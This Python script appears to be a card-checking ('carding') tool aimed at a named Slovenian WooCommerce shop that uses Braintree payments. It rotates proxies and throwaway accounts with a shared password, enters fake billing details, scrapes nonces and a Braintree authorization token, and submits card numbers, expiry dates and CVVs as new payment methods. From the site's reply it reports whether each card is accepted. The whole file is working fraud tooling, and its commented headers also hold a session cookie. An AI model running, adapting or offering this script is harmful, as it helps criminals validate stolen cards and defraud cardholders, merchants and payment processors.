import requests,re,base64,uuid,secrets
from bs4 import BeautifulSoup
from proxy import proxies
def getstr(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None
    
current_index = 0
def login_user():
    global current_index
    users = ['ftfhccfcg','guguygh','pkpoijiovh','jbkbgyg','vygyft',
             'tfuftutft','hgcvhg2']
    
    username = users[current_index]
    current_index = (current_index + 1) % len(users)
    return username

async def B3_Auth2(cc,mm,yy,cvv):
    r = requests.Session()
    r.proxies = proxies()
    user = login_user()
    correction_id = secrets.token_hex(16)
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    response = r.get('https://www.tojeto.info/moj-racun/', headers=headers)
    try:
        _wpnonce = getstr(response.text, 'name="_wpnonce" value="', '"')
    except:
        return 'Error: Failed to retrieve'
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'CookieConsent={stamp:%275JrYgIyzjGaF+AqO16GFPhV7caL1bvpGt7XBB//1eiOxcPwddagCSQ==%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cmethod:%27explicit%27%2Cver:1%2Cutc:1727545871502%2Cregion:%27in%27}; _ga=GA1.1.1314173099.1727545867; wordpress_test_cookie=WP%20Cookie%20check; _ga_SMXFN7N0CK=GS1.1.1727603922.3.1.1727604175.51.0.0',
        'origin': 'https://www.tojeto.info',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.tojeto.info/moj-racun/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    data = {
        'username': user,
        'password': 'Ayanpro@087',
        '_wpnonce': _wpnonce,
        '_wp_http_referer': '/moj-racun/',
        'login': 'Prijava',
    }

    response = r.post('https://www.tojeto.info/moj-racun/', headers=headers, data=data)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.tojeto.info/moj-racun/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    response = r.get('https://www.tojeto.info/moj-racun/edit-address/', headers=headers)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.tojeto.info/moj-racun/edit-address/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }
    try:
        response = r.get('https://www.tojeto.info/moj-racun/edit-address/placilo/', headers=headers)
        edit_adrs_nonce = getstr(response.text, 'woocommerce-edit-address-nonce" value="', '"')
    except:
        return 'Error: Failed to retrieve edit'
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'CookieConsent={stamp:%275JrYgIyzjGaF+AqO16GFPhV7caL1bvpGt7XBB//1eiOxcPwddagCSQ==%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cmethod:%27explicit%27%2Cver:1%2Cutc:1727545871502%2Cregion:%27in%27}; _ga=GA1.1.1314173099.1727545867; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_90934c24db0928f5dd52a63b630aab07=guguygh%7C1727777013%7Cdf7s5Vk76A7pYhqN6ySNyVJGuksSELogH0eyb2Ucmwt%7C8c644d4c2a6e02bb5ce5dbafe6922c039edfebd91b410c12e821620b981f6b28; _ga_SMXFN7N0CK=GS1.1.1727603922.3.1.1727604929.60.0.0',
        'origin': 'https://www.tojeto.info',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.tojeto.info/moj-racun/edit-address/placilo/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    data = {
        'billing_first_name': 'Albedo',
        'billing_last_name': 'Jones',
        'billing_company': '',
        'billing_country': 'US',
        'billing_address_1': 'New York',
        'billing_address_2': '',
        'billing_city': 'New York',
        'billing_postcode': '10080',
        'billing_phone': '8644587431',
        'billing_email': 'guguygh@aol.co',
        'save_address': 'Shrani naslov',
        'woocommerce-edit-address-nonce': edit_adrs_nonce,
        '_wp_http_referer': '/moj-racun/edit-address/placilo/',
        'action': 'edit_address',
    }

    response = r.post('https://www.tojeto.info/moj-racun/edit-address/placilo/', headers=headers, data=data)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.tojeto.info/moj-racun/edit-address/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }
    try:
        response = r.get('https://www.tojeto.info/moj-racun/payment-methods/%20/', headers=headers)
        client_token_nonce = getstr(response.text, '"client_token_nonce":"', '"').strip()
    except:
        return 'Error: Failed to retrieve client token nonce'
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        # 'cookie': 'CookieConsent={stamp:%275JrYgIyzjGaF+AqO16GFPhV7caL1bvpGt7XBB//1eiOxcPwddagCSQ==%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cmethod:%27explicit%27%2Cver:1%2Cutc:1727545871502%2Cregion:%27in%27}; _ga=GA1.1.1314173099.1727545867; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_90934c24db0928f5dd52a63b630aab07=guguygh%7C1727777013%7Cdf7s5Vk76A7pYhqN6ySNyVJGuksSELogH0eyb2Ucmwt%7C8c644d4c2a6e02bb5ce5dbafe6922c039edfebd91b410c12e821620b981f6b28; _ga_SMXFN7N0CK=GS1.1.1727603922.3.1.1727605723.58.0.0',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.tojeto.info/moj-racun/add-payment-method/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    try:
        response = r.get('https://www.tojeto.info/moj-racun/add-payment-method/', headers=headers)
        payment_nonce = getstr(response.text, 'woocommerce-add-payment-method-nonce" value="', '"')
    except:
        return 'Error: Failed to retrieve payment nonce'
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.tojeto.info',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://www.tojeto.info/moj-racun/add-payment-method/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client_token_nonce,
    }
    try:
        response = r.post('https://www.tojeto.info/wp-admin/admin-ajax.php', headers=headers, data=data).json()
        dec = base64.b64decode(response['data']).decode('utf-8')
        at = getstr(dec, '"authorizationFingerprint":"', '"')
    except:
        return 'Error: Failed to retrieve client token'
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {at}',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': str(uuid.uuid4()),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvv,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    try:
        response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        token = response.json()['data']['tokenizeCreditCard']['token']
    except:
        return 'Error: Failed to tokenize credit card'
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'CookieConsent={stamp:%275JrYgIyzjGaF+AqO16GFPhV7caL1bvpGt7XBB//1eiOxcPwddagCSQ==%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cmethod:%27explicit%27%2Cver:1%2Cutc:1727545871502%2Cregion:%27in%27}; _ga=GA1.1.1314173099.1727545867; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_90934c24db0928f5dd52a63b630aab07=guguygh%7C1727777013%7Cdf7s5Vk76A7pYhqN6ySNyVJGuksSELogH0eyb2Ucmwt%7C8c644d4c2a6e02bb5ce5dbafe6922c039edfebd91b410c12e821620b981f6b28; _ga_SMXFN7N0CK=GS1.1.1727603922.3.1.1727605385.58.0.0',
        'origin': 'https://www.tojeto.info',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.tojeto.info/moj-racun/add-payment-method/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    data = {
        'payment_method': 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': 'master-card',
        'wc-braintree-credit-card-3d-secure-enabled': '',
        'wc-braintree-credit-card-3d-secure-verified': '',
        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
        'wc_braintree_credit_card_payment_nonce': token,
        'wc_braintree_device_data': '{"correlation_id":"'+correction_id+'"}',
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        'woocommerce-add-payment-method-nonce': payment_nonce,
        '_wp_http_referer': '/moj-racun/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }
    try:
        response = r.post('https://www.tojeto.info/moj-racun/add-payment-method/', headers=headers, data=data)
        soup = BeautifulSoup(response.text, 'html.parser')
        error_message = soup.find('ul', class_='error-messages')
        success_message = soup.find('div', class_='woocommerce-message')
        try:
            if error_message:
                error_text = error_message.get_text(strip=True)
                formatted_error = re.sub(r'Status code\s+', '', error_text)
                return formatted_error
            elif success_message:
                success_text = success_message.get_text(strip=True)
                return success_text
            else:
                return 'Error: Failed to parse response'
        except:
            return 'Error: Failed to parse response'
    except:
        return 'Error: Failed to add payment method'